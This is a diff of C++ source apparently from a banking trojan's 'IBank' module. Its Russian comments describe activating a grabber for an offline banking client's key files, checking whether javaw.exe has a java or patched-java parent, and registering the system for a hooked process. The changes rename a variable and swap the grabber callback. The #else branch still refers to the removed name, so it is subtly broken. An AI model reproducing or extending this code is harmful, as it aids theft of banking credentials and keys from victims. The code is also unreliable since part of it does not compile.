@@ -316,7 +316,7 @@ namespace IBank
 	void SystemActivated2(LPVOID Sender)
 	{
 		IBDBG("IBank", "граббер для оффлайн версии активирован");
-		AddFileGrabber(IsFileKeyJava);
+		AddFileGrabber(IsFileKeyJavaW);
 	}
 
 	void SystemActivatedW(LPVOID Sender)
@@ -477,7 +477,6 @@ namespace IBank
 		PIBankLog L = (PIBankLog)Data;
 		if (L == NULL)
 			return 0;
-
 
 		for (int i = 1; i <= 10; i++)
 		{
@@ -645,14 +644,13 @@ void RegisterIBankSystem(DWORD hashApp)
 	if( hashApp == PROCESS_HASH_JAVAW)
 	{
 		//если javaw.exe запущен не из под java.exe, то возможно это оффлайн версия ибанка
-		DWORD ParentPID = GetHashForPid(GetParentPID());
+		DWORD hashParent = GetHashForPid(GetParentPID());
 
 		#ifdef JAVS_PATCHERH
-			BOOL ParentIsJava = ParentPID == PROCESS_HASH_JAVA ||
-								ParentPID == PROCESS_HASH_PATCHED_JAVA ||
-								ParentPID == PROCESS_HASH_JAVAW; // При работающем патчере запускается из под этого проесса
+			BOOL ParentIsJava = (hashParent == PROCESS_HASH_JAVA || 
+								hashParent == PROCESS_HASH_PATCHED_JAVA); // При работающем патчере запускается из под этого процесса
 		#else
-			BOOL ParentIsJava = ParentPID == PROCESS_HASH_JAVA;
+			BOOL ParentIsJava = (ParentPID == PROCESS_HASH_JAVA);
 		#endif
 
 
@@ -666,7 +664,7 @@ void RegisterIBankSystem(DWORD hashApp)
 	if (S != NULL)
 	{
 
-		IBank::ProcessID = GetUniquePID();
+		if( IBank::ProcessID == 0 ) IBank::ProcessID = GetUniquePID();
 
 		IBDBG("IBank", "Система зарегистрирована");
 		IBank::System = S;
